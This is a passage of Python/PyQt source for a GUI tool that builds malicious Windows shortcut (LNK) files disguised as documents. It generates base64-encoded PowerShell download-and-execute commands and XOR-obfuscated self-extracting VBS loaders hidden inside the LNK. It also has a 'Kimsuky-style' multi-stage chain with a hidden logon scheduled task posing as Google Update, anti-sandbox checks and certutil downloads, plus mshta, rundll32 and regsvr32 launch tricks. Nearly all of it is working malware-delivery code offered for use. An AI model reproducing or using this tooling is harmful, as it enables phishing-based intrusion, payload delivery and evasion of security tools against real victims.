        evasion_help.triggered.connect(self.show_evasion_help)
        help_menu.addAction(evasion_help)
        embed_help = QAction("Embedded Payload Guide", self)
        embed_help.triggered.connect(self.show_embed_help)
        help_menu.addAction(embed_help)

    # ----------------------------------------------------------------------
    # Helper Methods (Payload, Encoding, Logging)
    # ----------------------------------------------------------------------
    def get_payload(self):
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Please enter a URL first")
            return None
        pause = self.pause_cb.isChecked()
        debug = self.debug_cb.isChecked()
        stealth = self.stealth_combo.currentIndex()
        mode = self.type_combo.currentIndex()
        if mode == 0:
            return PowerShellConverter.create_download_and_open_payload(url, pause, debug, stealth)
        elif mode == 1:
            return PowerShellConverter.create_memory_execute_payload(url, pause, debug, stealth)
        else:
            return PowerShellConverter.create_stealth_payload(url, pause, debug, stealth)

    def load_url(self, url):
        self.url_input.setText(url)
        self.log(f"Loaded: {url[:50]}...")

    def show_command(self):
        payload = self.get_payload()
        if payload:
            self.cmd_display.setText(payload)
            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
            self.log(f"[OK] Command generated - Mode: {mode}, Stealth: {stealth}")
            self.step1_indicator.setText("[X] Step 1")
            self.step1_indicator.setStyleSheet("color: #00FF00;")
            self.step2_indicator.setText("[ ] Step 2")
            self.step2_indicator.setStyleSheet("color: #666666;")
            self.step3_indicator.setText("[ ] Step 3")
            self.step3_indicator.setStyleSheet("color: #666666;")
            self.step4_indicator.setText("[ ] Step 4")
            self.step4_indicator.setStyleSheet("color: #666666;")

    def encode(self):
        payload = self.get_payload()
        if payload:
            self.cmd_display.setText(payload)
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            full_arg = f"-E {encoded}"
            self.arg_display.setText(full_arg)
            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
            self.log(f"[OK] Encoded - Mode: {mode}, Stealth: {stealth} | Length: {len(encoded)} chars")
            self.step1_indicator.setText("[X] Step 1")
            self.step1_indicator.setStyleSheet("color: #00FF00;")
            self.step2_indicator.setText("[X] Step 2")
            self.step2_indicator.setStyleSheet("color: #00FF00;")
            self.step3_indicator.setText("[ ] Step 3")
            self.step3_indicator.setStyleSheet("color: #666666;")
            self.step4_indicator.setText("[ ] Step 4")
            self.step4_indicator.setStyleSheet("color: #666666;")

    def copy_arg(self):
        arg = self.arg_display.toPlainText().strip()
        if arg:
            QApplication.clipboard().setText(arg)
            self.import_input.setText(arg)
            self.log("[OK] Copied to clipboard")
            self.step1_indicator.setText("[X] Step 1")
            self.step1_indicator.setStyleSheet("color: #00FF00;")
            self.step2_indicator.setText("[X] Step 2")
            self.step2_indicator.setStyleSheet("color: #00FF00;")
            self.step3_indicator.setText("[X] Step 3")
            self.step3_indicator.setStyleSheet("color: #00FF00;")
            self.step4_indicator.setText("[ ] Step 4")
            self.step4_indicator.setStyleSheet("color: #666666;")

    def use_in_lnk(self):
        arg = self.arg_display.toPlainText().strip()
        if arg:
            self.import_input.setText(arg)
            self.preview_label.setText(f"Arguments: {arg[:100]}...")
            self.log("[OK] Loaded into LNK generator")
            self.step1_indicator.setText("[X] Step 1")
            self.step1_indicator.setStyleSheet("color: #00FF00;")
            self.step2_indicator.setText("[X] Step 2")
            self.step2_indicator.setStyleSheet("color: #00FF00;")
            self.step3_indicator.setText("[X] Step 3")
            self.step3_indicator.setStyleSheet("color: #00FF00;")
            self.step4_indicator.setText("[X] Step 4")
            self.step4_indicator.setStyleSheet("color: #00FF00;")

    def import_arg(self):
        arg = self.import_input.text().strip()
        if arg:
            self.preview_label.setText(f"Arguments: {arg[:100]}...")
            self.log("[OK] Imported argument")

    def use_raw_base64(self):
        raw_b64 = self.base64_input.toPlainText().strip()
        if not raw_b64:
            QMessageBox.warning(self, "Warning", "No base64 string provided.")
            return
        try:
            decoded = base64.b64decode(raw_b64).decode('utf-16le')
            self.log(f"[OK] Base64 decoded successfully ({len(decoded)} chars)")
        except Exception as e:
            reply = QMessageBox.question(
                self, "Invalid Base64",
                f"Failed to decode as UTF-16LE base64:\n{str(e)}\n\nUse anyway?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply == QMessageBox.StandardButton.No:
                return
        full_arg = f"-E {raw_b64}"
        self.import_input.setText(full_arg)
        self.preview_label.setText(f"Arguments: {full_arg[:100]}...")
        self.log(f"[OK] Raw base64 loaded as payload (length {len(raw_b64)})")
        if not self.raw_mode_cb.isChecked():
            self.mode_indicator.setText("Current Mode: Direct Base64 Payload")
            self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")

    def generate_desc(self):
        date = datetime.now().strftime("%d/%m/%Y")
        icon = self.icon_combo.currentText()
        self.desc_input.setText(f"Type: {icon}\nSize: 1.23 MB\nDate modified: {date}")

    def log(self, msg):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {msg}")
        cursor = self.console.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        self.console.setTextCursor(cursor)
        QApplication.processEvents()

    # ----------------------------------------------------------------------
    # Evasion Payload Generators
    # ----------------------------------------------------------------------
    def _generate_self_extract_hex_vbs(self, key_bytes: bytes, encoding_name: str, script_bytes: bytes) -> bytes:
        key_array = ','.join(str(b) for b in key_bytes)
        payload_b64 = base64.b64encode(script_bytes).decode('ascii')
        magic = "GHOSTLNK"
        vbs = f'''
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
data = f.ReadAll
f.Close
pos = InStr(data, "{magic}")
If pos > 0 Then
    payload = Mid(data, pos + Len("{magic}"))
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set el = xml.createElement("tmp")
    el.DataType = "bin.base64"
    el.Text = payload
    arr = el.NodeTypedValue
    key = Array({key_array})
    For i = 0 To UBound(arr)
        arr(i) = arr(i) Xor key(i Mod (UBound(key)+1))
    Next
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "{ 'utf-16le' if encoding_name == 'Unicode' else 'utf-8' }"
    stream.Open
    stream.WriteText arr
    psFile = fso.GetSpecialFolder(2) & "\\{uuid.uuid4()}.ps1"
    stream.SaveToFile psFile, 2
    stream.Close
    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -File " & psFile, 0, False
End If
'''
        vbs_hex = vbs.encode('utf-16le').hex().upper()
        marker = "GHOSTLNK_HEX:"
        final_payload = marker.encode('utf-8') + vbs_hex.encode('ascii') + b"\r\n" + magic.encode('utf-8') + payload_b64.encode('ascii')
        return final_payload

    def _generate_self_extract_b64_vbs(self, key_bytes: bytes, encoding_name: str, script_bytes: bytes) -> bytes:
        key_array = ','.join(str(b) for b in key_bytes)
        payload_b64 = base64.b64encode(script_bytes).decode('ascii')
        magic = "GHOSTLNK"
        vbs = f'''
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
data = f.ReadAll
f.Close
pos = InStr(data, "{magic}")
If pos > 0 Then
    payload = Mid(data, pos + Len("{magic}"))
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set el = xml.createElement("tmp")
    el.DataType = "bin.base64"
    el.Text = payload
    arr = el.NodeTypedValue
    key = Array({key_array})
    For i = 0 To UBound(arr)
        arr(i) = arr(i) Xor key(i Mod (UBound(key)+1))
    Next
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "{ 'utf-16le' if encoding_name == 'Unicode' else 'utf-8' }"
    stream.Open
    stream.WriteText arr
    psFile = fso.GetSpecialFolder(2) & "\\{uuid.uuid4()}.ps1"
    stream.SaveToFile psFile, 2
    stream.Close
    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -File " & psFile, 0, False
End If
'''
        vbs_b64 = base64.b64encode(vbs.encode('utf-16le')).decode('ascii')
        marker = "GHOSTLNK_B64:"
        final_payload = marker.encode('utf-8') + vbs_b64.encode('ascii') + b"\r\n" + magic.encode('utf-8') + payload_b64.encode('ascii')
        return final_payload

    def _generate_extractor_vbs(self, lnk_filename: str, key_bytes: bytes, encoding_name: str) -> str:
        key_array = ','.join(str(b) for b in key_bytes)
        magic = "GHOSTLNK"
        vbs = f'''
Set fso = CreateObject("Scripting.FileSystemObject")
lnkPath = fso.GetAbsolutePathName("{lnk_filename}")
Set f = fso.OpenTextFile(lnkPath, 1)
data = f.ReadAll
f.Close
pos = InStr(data, "{magic}")
If pos > 0 Then
    payload = Mid(data, pos + Len("{magic}"))
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set el = xml.createElement("tmp")
    el.DataType = "bin.base64"
    el.Text = payload
    arr = el.NodeTypedValue
    key = Array({key_array})
    For i = 0 To UBound(arr)
        arr(i) = arr(i) Xor key(i Mod (UBound(key)+1))
    Next
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "{ 'utf-16le' if encoding_name == 'Unicode' else 'utf-8' }"
    stream.Open
    stream.WriteText arr
    psFile = fso.GetSpecialFolder(2) & "\\{uuid.uuid4()}.ps1"
    stream.SaveToFile psFile, 2
    stream.Close
    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -File " & psFile, 0, False
End If
'''
        return vbs

    def _build_kimsuky_chain(self, decoy_url: str, payload_url: str) -> dict:
        """Generate all files for the Kimsuky‑style multi‑stage campaign."""
        folder_name = generate_random_folder_name()
        task_name = generate_task_name()
        ps1_filename = f"update_{random.randint(1000,9999)}.ps1"
        bat_filename = f"setup_{random.randint(100,999)}.bat"

        # XML for scheduled task
        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Google Update Task Machine</Description>
    <Author>Google Inc.</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>//B "%APPDATA%\\Microsoft\\{folder_name}\\stage2.vbs"</Arguments>
    </Exec>
  </Actions>
</Task>'''

        # VBS – opens decoy PDF and launches PowerShell stage
        vbs_content = f'''
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -WindowStyle Hidden -Command Invoke-Item '{decoy_url}'", 0, False
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%APPDATA%\\Microsoft\\{folder_name}\\{ps1_filename}""", 0, False
'''

        # PS1 – anti‑sandbox checks and download next stage
        ps1_content = f'''
$bad = @("wireshark","procmon","procexp","vboxservice","vmtoolsd","vboxtray","xenservice","sandboxie","sbiesvc","python","ida","ollydbg","x64dbg");
$p = Get-Process -ErrorAction SilentlyContinue;
foreach ($b in $bad) {{ if ($p.Name -match $b) {{ exit }} }}
$f = "$env:APPDATA\\Microsoft\\{folder_name}";
attrib +h +s $f;
(New-Object Net.WebClient).DownloadFile("{payload_url}", "$f\\{bat_filename}");
Start-Process -FilePath "$f\\{bat_filename}" -WindowStyle Hidden;
'''

        # BAT – downloads and executes final Python payload
        bat_content = f'''
@echo off
certutil -urlcache -split -f "{payload_url}" "%APPDATA%\\Microsoft\\{folder_name}\\update.py"
python "%APPDATA%\\Microsoft\\{folder_name}\\update.py"
'''

        return {
            "folder": folder_name,
            "task_name": task_name,
            "xml": xml_content,
            "vbs": vbs_content,
            "ps1": ps1_content,
            "bat": bat_content,
            "ps1_filename": ps1_filename,
            "bat_filename": bat_filename
        }

    def generate_embedded_payload(self):
        script = self.embedded_input.toPlainText().strip()
        if not script:
            QMessageBox.warning(self, "Warning", "No script content provided.")
            return

        if self.obfuscate_cb.isChecked():
            script = obfuscate_strings(script)

        antisanbox = build_antisanbox_stub() if (self.append_cb.isChecked() or self.binary_smuggle_cb.isChecked() or self.self_extract_b64_cb.isChecked() or self.self_extract_hex_cb.isChecked()) else ""

        encoding_choice = self.encoding_combo.currentText()
        if "UTF-16LE" in encoding_choice:
            encoding_name = "Unicode"
            script_bytes = (antisanbox + script).encode('utf-16le')
        elif "UTF-8" in encoding_choice:
            encoding_name = "UTF8"
            script_bytes = (antisanbox + script).encode('utf-8')
        else:
            encoding_name = "ASCII"
            script_bytes = (antisanbox + script).encode('ascii', errors='ignore')

        key_bytes = None
        if self.xor_cb.isChecked():
            key_str = self.xor_key.text().strip()
            if not key_str:
                QMessageBox.warning(self, "Warning", "XOR key required.")
                return
            if key_str.startswith("0x"):
                key_bytes = bytes([int(key_str, 16)])
            else:
                key_bytes = key_str.encode('utf-8')
            script_bytes = xor_encode(script_bytes, key_bytes)
        else:
            key_bytes = b'\x00'
        self.xor_key_bytes = key_bytes

        if self.self_extract_hex_cb.isChecked():
            final_payload = self._generate_self_extract_hex_vbs(key_bytes, encoding_name, script_bytes)
            self.appended_payload_bytes = final_payload
            self.import_input.setText("")
            self.preview_label.setText("Target: cmd.exe | findstr + certutil -decodehex")
            self.log(f"[OK] Self-Extracting LNK (Hex): payload {len(final_payload)} bytes appended.")
            self.mode_indicator.setText("Current Mode: Self-Extracting LNK (Hex)")

        elif self.self_extract_b64_cb.isChecked():
            final_payload = self._generate_self_extract_b64_vbs(key_bytes, encoding_name, script_bytes)
            self.appended_payload_bytes = final_payload
            self.import_input.setText("")
            self.preview_label.setText("Target: cmd.exe | findstr + certutil -decode")
            self.log(f"[OK] Self-Extracting LNK (Base64): payload {len(final_payload)} bytes appended.")
            self.mode_indicator.setText("Current Mode: Self-Extracting LNK (Base64)")

        elif self.true_icon_cb.isChecked():
            if len(script_bytes) > 500:
                QMessageBox.warning(self, "Payload Too Large",
                    "True Icon Smuggling can only store up to ~500 bytes.\n"
                    "Reduce script size or use a smaller XOR key."
                )
                return
            self.appended_payload_bytes = script_bytes
            self.import_input.setText("")
            self.preview_label.setText("Target: notepad.exe | Extractor VBS will be saved")
            self.log(f"[OK] True Icon Smuggling: payload {len(script_bytes)} bytes embedded.")
            self.mode_indicator.setText("Current Mode: True Icon Smuggling")

        elif self.binary_smuggle_cb.isChecked():
            key_array = ','.join(str(b) for b in key_bytes)
            magic = "GHOSTLNK"
            vbs = f'''
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
data = f.ReadAll
f.Close
pos = InStr(data, "{magic}")
If pos > 0 Then
    payload = Mid(data, pos + Len("{magic}"))
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set el = xml.createElement("tmp")
    el.DataType = "bin.base64"
    el.Text = payload
    arr = el.NodeTypedValue
    key = Array({key_array})
    For i = 0 To UBound(arr)
        arr(i) = arr(i) Xor key(i Mod (UBound(key)+1))
    Next
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "{ 'utf-16le' if encoding_name == 'Unicode' else 'utf-8' }"
    stream.Open
    stream.WriteText arr
    psFile = fso.GetSpecialFolder(2) & "\\{uuid.uuid4()}.ps1"
    stream.SaveToFile psFile, 2
    stream.Close
    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -File " & psFile, 0, False
End If
'''
            payload_b64 = base64.b64encode(script_bytes).decode('ascii')
            final_payload = vbs.encode('utf-8') + magic.encode('utf-8') + payload_b64.encode('ascii')
            self.appended_payload_bytes = final_payload
            self.import_input.setText("")
            self.preview_label.setText("Target: wscript.exe | Self‑extracting VBS")
            self.log(f"[OK] Binary Smuggling: VBS + payload embedded ({len(final_payload)} bytes).")
            self.mode_indicator.setText("Current Mode: Binary Icon Smuggling")

        elif self.append_cb.isChecked():
            stub = f'''
$p=$MyInvocation.MyCommand.Path;
$b=[System.Reflection.Assembly]::LoadWithPartialName('System.IO').GetType('System.IO.File').GetMethod('ReadAllBytes').Invoke($null,@($p));
$x=$b[-{len(script_bytes)}..-1];
$k=@({','.join(str(b) for b in key_bytes)});
for($i=0;$i -lt $x.Length;$i++){{$x[$i]=$x[$i] -bxor $k[$i%$k.Length]}};
$s=[System.Text.Encoding]::{encoding_name}.GetString($x);
Invoke-Expression $s
'''
            stub_compact = ' '.join(stub.split())
            final_arg = f'-Command "{stub_compact}"'
            self.import_input.setText(final_arg)
            self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
            self.appended_payload_bytes = script_bytes
            self.log(f"[OK] Append mode with PowerShell stub.")
            self.mode_indicator.setText("Current Mode: Appended Payload (PowerShell)")

        else:
            encoded_b64 = base64.b64encode(script_bytes).decode('ascii')
            if self.xor_cb.isChecked():
                key_b64 = base64.b64encode(key_bytes).decode('ascii')
                xor_decoder = f"$k=[Convert]::FromBase64String('{key_b64}');$d=[Convert]::FromBase64String($d);for($i=0;$i -lt $d.Length;$i++){{$d[$i]=$d[$i] -bxor $k[$i % $k.Length]}};$d=[System.Text.Encoding]::{encoding_name}.GetString($d)"
                ps_command = f"$d='{encoded_b64}';{xor_decoder}|iex"
            else:
                ps_command = f"$d='{encoded_b64}';[System.Text.Encoding]::{encoding_name}.GetString([System.Convert]::FromBase64String($d))|iex"
            final_encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
            final_arg = f"-E {final_encoded}"
            self.import_input.setText(final_arg)
            self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
            self.appended_payload_bytes = None
            self.log(f"[OK] Embedded payload generated ({len(encoded_b64)} chars base64)")
            self.mode_indicator.setText("Current Mode: Embedded Payload (No Network)")

        self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")

    # ----------------------------------------------------------------------
    # Simple Multi-Stage Stager (original)
    # ----------------------------------------------------------------------
    def _build_multistage_ps(self):
        decoy = self.decoy_url.text().strip()
        payload = self.payload_url.text().strip()
        folder_name = generate_random_folder_name()
        task_name = generate_task_name()
        vbs_script = f'''
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -WindowStyle Hidden -Command Invoke-Item '{decoy}'", 0, False
objShell.Run "schtasks /create /tn {task_name} /tr \\"powershell -WindowStyle Hidden -Command iex (iwr '{payload}' -UseBasicParsing)\\" /sc ONLOGON /f", 0, False
objShell.Run "schtasks /run /tn {task_name}", 0, False
'''
        vbs_b64 = base64.b64encode(vbs_script.encode('utf-16le')).decode()
        ps_stager = f'''
$f="$env:APPDATA\\Microsoft\\{folder_name}";
mkdir $f -Force;
attrib +h +s $f;
$vbs=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{vbs_b64}'));
$vbs | Out-File -FilePath "$f\\update.vbs" -Encoding Unicode;
Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
'''
        return ps_stager.strip()

    # ----------------------------------------------------------------------
    # Main LNK Generation
    # ----------------------------------------------------------------------
    def generate_lnk(self):
        try:
            target_path = ""
            arguments = ""
            working_dir = None
            use_proxy = False
            spoof_target = None
            regsvr32_unc = None
            mshta_url = None
            rundll32_js = None
            multistage = False
            appended_payload = None
            icon_payload = None

            if self.raw_mode_cb.isChecked():
                target_path = self.raw_target_path.text().strip()
                if not target_path:
                    QMessageBox.warning(self, "Warning", "Raw Target Mode enabled but no target path specified.")
                    return
                target_path = os.path.expandvars(target_path)
                arguments = self.raw_arguments.text().strip()
                working_dir = self.raw_working_dir.text().strip() or None
                if working_dir:
                    working_dir = os.path.expandvars(working_dir)
                if not os.path.exists(target_path):
                    reply = QMessageBox.question(self, "Target Not Found",
                                                 f"The target '{target_path}' does not exist.\nDo you want to continue anyway?",
                                                 QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                    if reply == QMessageBox.StandardButton.No:
                        return
                self.log(f"Raw Target Mode: {target_path} {arguments}")

            elif self.kimsuky_cb.isChecked():
                decoy = self.kimsuky_decoy.text().strip()
                payload = self.kimsuky_payload.text().strip()
                if not decoy or not payload:
                    QMessageBox.warning(self, "Warning", "Kimsuky campaign requires Decoy PDF URL and Payload URL.")
                    return
                chain = self._build_kimsuky_chain(decoy, payload)
                folder = QFileDialog.getExistingDirectory(self, "Select folder to save Kimsuky campaign files")
                if not folder:
                    return
                # Save all files
                with open(os.path.join(folder, "task.xml"), "w", encoding="utf-8") as f:
                    f.write(chain["xml"])
                with open(os.path.join(folder, "stage2.vbs"), "w", encoding="utf-8") as f:
                    f.write(chain["vbs"])
                with open(os.path.join(folder, chain["ps1_filename"]), "w", encoding="utf-8") as f:
                    f.write(chain["ps1"])
                with open(os.path.join(folder, chain["bat_filename"]), "w", encoding="utf-8") as f:
                    f.write(chain["bat"])
                target_path = r"C:\Windows\explorer.exe"
                arguments = ""
                working_dir = None
                appended_payload = None
                self.log(f"[OK] Kimsuky campaign saved to {folder}")

            else:
                if self.multistage_cb.isChecked():
                    if not self.decoy_url.text().strip() or not self.payload_url.text().strip():
                        QMessageBox.warning(self, "Warning", "Multi-Stage Stager requires Decoy URL and Payload URL.")
                        return
                    ps_stager = self._build_multistage_ps()
                    encoded = base64.b64encode(ps_stager.encode('utf-16le')).decode()
                    arg = f"-E {encoded}"
                    target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
                    arguments = arg
                    working_dir = None
                    use_proxy = self.proxy_cb.isChecked()
                    spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
                    multistage = True
                else:
                    if self.mshta_cb.isChecked():
                        mshta_url = self.mshta_url.text().strip()
                        if not mshta_url:
                            QMessageBox.warning(self, "Warning", "mshta.exe URL required.")
                            return
                        target_path = r"C:\Windows\System32\mshta.exe"
                        arguments = f'"{mshta_url}"'
                        working_dir = None
                    elif self.rundll_cb.isChecked():
                        rundll32_js = self.rundll_js.text().strip()
                        if not rundll32_js:
                            QMessageBox.warning(self, "Warning", "JavaScript payload required.")
                            return
                        target_path = r"C:\Windows\System32\rundll32.exe"
                        arguments = f'javascript:"\\..\\mshtml,RunHTMLApplication";{rundll32_js}'
                        working_dir = None
                    elif self.regsvr_cb.isChecked():
                        regsvr32_unc = self.regsvr_url.text().strip()
                        if not regsvr32_unc:
                            QMessageBox.warning(self, "Warning", "regsvr32 URL required.")
                            return
                        target_path = r"C:\Windows\System32\regsvr32.exe"
                        arguments = f'/s /n /i:"{regsvr32_unc}" scrobj.dll'
                        working_dir = None
                    elif self.binary_smuggle_cb.isChecked():
                        target_path = r"C:\Windows\System32\wscript.exe"
                        arguments = "//B"
                        working_dir = None
                        appended_payload = getattr(self, 'appended_payload_bytes', None)
                    elif self.true_icon_cb.isChecked():
                        target_path = r"C:\Windows\System32\notepad.exe"
                        arguments = ""
                        working_dir = None
                        icon_payload = getattr(self, 'appended_payload_bytes', None)
                        if icon_payload and len(icon_payload) > 500:
                            QMessageBox.warning(self, "Payload Too Large",
                                "True Icon Smuggling can only store up to ~500 bytes.\n"
                                "Reduce script size or use a smaller XOR key."
                            )
                            return
                        appended_payload = None
                    elif self.self_extract_b64_cb.isChecked():
                        target_path = r"C:\Windows\System32\cmd.exe"
                        arguments = r'/c "findstr /b "GHOSTLNK_B64:" "%~f0" > "%TEMP%\e.b64" & certutil -decode "%TEMP%\e.b64" "%TEMP%\e.vbs" & wscript //B "%TEMP%\e.vbs""'
                        working_dir = None
                        appended_payload = getattr(self, 'appended_payload_bytes', None)
                    elif self.self_extract_hex_cb.isChecked():
                        target_path = r"C:\Windows\System32\cmd.exe"
                        arguments = r'/c "findstr /b "GHOSTLNK_HEX:" "%~f0" > "%TEMP%\e.hex" & certutil -decodehex "%TEMP%\e.hex" "%TEMP%\e.vbs" & wscript //B "%TEMP%\e.vbs""'
                        working_dir = None
                        appended_payload = getattr(self, 'appended_payload_bytes', None)
                    else:
                        arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
                        if not arg:
                            QMessageBox.warning(self, "Warning", "No argument set (import or generate first).")
                            return
                        target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
                        arguments = arg
                        working_dir = None
                        use_proxy = self.proxy_cb.isChecked()
                        spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
                        appended_payload = getattr(self, 'appended_payload_bytes', None)

            icon = self.icon_combo.currentText()
            icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
            name = self.filename_input.text().strip() or "Document"
            ext_choice = self.ext_combo.currentText()
            filename = f"{name}{ext_choice}"
            if self.lnk_cb.isChecked():
                filename += ".lnk"
            desc = self.desc_input.toPlainText().strip()
            if not desc:
                self.generate_desc()
                desc = self.desc_input.toPlainText().strip()

            save_path, _ = QFileDialog.getSaveFileName(self, "Save LNK File", filename, "LNK Files (*.lnk)")
            if not save_path:
                return

            if self.true_icon_cb.isChecked():
                extractor_path = os.path.splitext(save_path)[0] + "_extractor.vbs"
                encoding_choice = self.encoding_combo.currentText()
                enc_name = "Unicode" if "UTF-16LE" in encoding_choice else "UTF8"
                key_bytes = getattr(self, 'xor_key_bytes', b'\x00')
                vbs_content = self._generate_extractor_vbs(os.path.basename(save_path), key_bytes, enc_name)
                with open(extractor_path, 'w', encoding='utf-8') as f:
                    f.write(vbs_content)
                self.log(f"[OK] Extractor VBS saved: {os.path.basename(extractor_path)}")

            if not self.raw_mode_cb.isChecked() and not self.mshta_cb.isChecked() and not self.rundll_cb.isChecked() and not self.regsvr_cb.isChecked() and not self.kimsuky_cb.isChecked():
                stealth = self.stealth_combo.currentIndex()
                hide = self.hide_pwsh_cb.isChecked()
                mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
                self.log(f"Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, Append: {bool(appended_payload)}")
            else:
                stealth = 0
                hide = False
                self.log(f"Generating LNK (Proxy/Icon Smuggling/Self-Extract/Kimsuky) - Target: {target_path}")

            LNKEngine.create_lnk(
                save_path, target_path, arguments, icon_path, icon_idx, desc,
                working_dir=working_dir, stealth_level=stealth, hide_powershell=hide,
                use_proxy=use_proxy, spoof_target_path=spoof_target, regsvr32_unc=regsvr32_unc,
                mshta_url=mshta_url if self.mshta_cb.isChecked() else None,
                rundll32_js=rundll32_js if self.rundll_cb.isChecked() else None,
                appended_payload=appended_payload, icon_payload=icon_payload
            )

            size = os.path.getsize(save_path)
            self.log(f"[OK] LNK saved: {os.path.basename(save_path)} ({size} bytes)")
            QMessageBox.information(self, "Success", f"LNK generated:\n{save_path}")

        except Exception as e:
            self.log(f"[ERROR] {str(e)}")
            QMessageBox.critical(self, "Error", str(e))

    # ----------------------------------------------------------------------
    # Event Handlers & Helpers (Options, Tooltips, Indicators)
    # ----------------------------------------------------------------------
    def update_options(self):
        stealth = self.stealth_combo.currentIndex()
        hide_pwsh = self.hide_pwsh_cb.isChecked()
        self.pause_cb.setEnabled(True)
        self.debug_cb.setEnabled(True)
        self.hide_pwsh_cb.setEnabled(True)
        self.pause_cb.setStyleSheet("")
        self.debug_cb.setStyleSheet("")
        self.hide_pwsh_cb.setStyleSheet("")
        for cb in [self.pause_cb, self.debug_cb, self.hide_pwsh_cb]:
            cb.style().unpolish(cb)
            cb.style().polish(cb)
            cb.update()
        self.hide_indicator.setText("PowerShell Window: Visible")
        self.hide_indicator.setStyleSheet("color: #FFFF00;")
        mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
        current_mode = mode_names[self.type_combo.currentIndex()]
        self.mode_indicator.setText(f"Current Mode: {current_mode}")
        self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
        conflicts = []
        if hide_pwsh:
            self.pause_cb.setEnabled(False)
            self.pause_cb.setChecked(False)
            self.pause_cb.setStyleSheet("color: #666666;")
            conflicts.append("Pause disabled: Conflicts with hidden window")
            self.debug_cb.setEnabled(False)
            self.debug_cb.setChecked(False)
            self.debug_cb.setStyleSheet("color: #666666;")
            conflicts.append("Debug disabled: Debug output would be invisible")
            self.hide_pwsh_cb.setStyleSheet("color: #00FF00; font-weight: bold;")
            self.hide_indicator.setText("PowerShell Window: HIDDEN")
            self.hide_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
            for cb in [self.pause_cb, self.debug_cb, self.hide_pwsh_cb]:
                cb.style().unpolish(cb)
                cb.style().polish(cb)
                cb.update()
            self.mode_indicator.setText(f"Current Mode: {current_mode} (no pause, no debug)")
            self.mode_indicator.setStyleSheet("color: #FFFF00; font-weight: bold;")
        self.pause_cb.setToolTip(self.get_tooltip("pause", conflicts))
        self.debug_cb.setToolTip(self.get_tooltip("debug", conflicts))
        self.hide_pwsh_cb.setToolTip(self.get_tooltip("hide", conflicts))

    def get_tooltip(self, option, conflicts):
        base_tooltips = {
            "pause": "Pause after execution - keeps window open until keypress",
